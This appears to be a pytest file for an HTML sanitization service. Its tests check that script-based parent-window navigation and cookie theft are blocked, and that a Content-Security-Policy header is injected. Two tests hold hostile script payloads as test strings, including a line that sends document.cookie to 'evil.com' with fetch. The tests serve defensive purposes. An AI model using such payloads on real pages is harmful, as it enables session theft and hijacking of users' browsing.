import pytest
from app.services.security_service import security_service

def test_security_blocks_parent_escape():
    dangerous_html = "<div><script>parent.location.href = 'https://malicious.com';</script></div>"
    sanitized, warnings = security_service.sanitize_html_artifact(dangerous_html)
    assert "parent.location" not in sanitized
    assert len(warnings) > 0
    assert "Blocked parent window navigation" in warnings

def test_security_blocks_cookie_stealing():
    dangerous_html = "<script>const c = document.cookie; fetch('https://evil.com?c=' + c);</script>"
    sanitized, warnings = security_service.sanitize_html_artifact(dangerous_html)
    assert "document.cookie" not in sanitized
    assert any("cookie" in w.lower() for w in warnings)

def test_security_injects_csp():
    simple_html = "<div class='card'><h2>Hello World</h2></div>"
    sanitized, _ = security_service.sanitize_html_artifact(simple_html)
    assert "Content-Security-Policy" in sanitized
    assert "default-src 'none'" in sanitized
